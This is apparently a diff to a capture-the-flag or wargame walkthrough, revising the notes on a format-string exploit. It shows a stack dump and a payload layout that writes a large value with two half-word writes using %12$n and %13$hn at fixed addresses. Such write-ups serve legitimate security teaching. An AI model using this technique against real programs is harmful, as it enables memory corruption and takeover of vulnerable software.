@@ -24,12 +24,13 @@ Dump of assembler code for function n:
 End of assembler dump.
 
 # Same exploit as level3, except here the value is very large.
-# 0x1025544(16) == 16 millions, so instead, let's copy two half-words,
-# in order to speed up the process of writing the output of the conversion
+# 0x1025544(16) == 16 millions, so instead, let's split the padding value in
+# two in order to speed up the process of writing the output of the conversion
 # to stdout.
-# 0x102 and 0x5544 => 258 + 21828 bytes written, which is much less than previously.
-# We'll need to copy the smallest half word first, for obvious reasons.
-# Here it is the high order one.
+# 0x102 and 0x5544 => 258 + 21828 bytes written, which is much less than
+# previously.
+# We'll need to copy the smallest amount of padding first, 0x102,
+# because we can't decrement the internal conversion length of printf.
 # Relevant stack memory dump, this will be useful to identify which positional
 # indexes to use :
 
@@ -46,8 +47,17 @@ Breakpoint 1, 0x08048450 in p ()
 0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
 0xbffff4f0:	0x41414141
 
-# The first address will be popped off the stack when entering the stack frame
-# of printf, so the starting bytes of the buffer will be at $esp + 12.
+# The first address will be popped off the stack when executing printf, so the
+# starting bytes of the buffer will be at $esp + 12.
+# The payload is described below.
+# Thi indicates the address of the high-order half-word of the target,
+# tlow the other half.
+# We use a size modifier flag on the second conversion to avoid replacing the
+# upper half of the wanted value with bits set at 0 :
+
+[target]              [pad1]     [offset1]  [pad2]        [offset2]
+[thi]      [tlow]     [0x102 - 8][$esp + 12][0x5544-0x102][$esp + 13]
+[0x8049812][0x8049810][%250x]    [%12$n]    [%21570x]     [%13$hn]
 
 # Finally :
 #
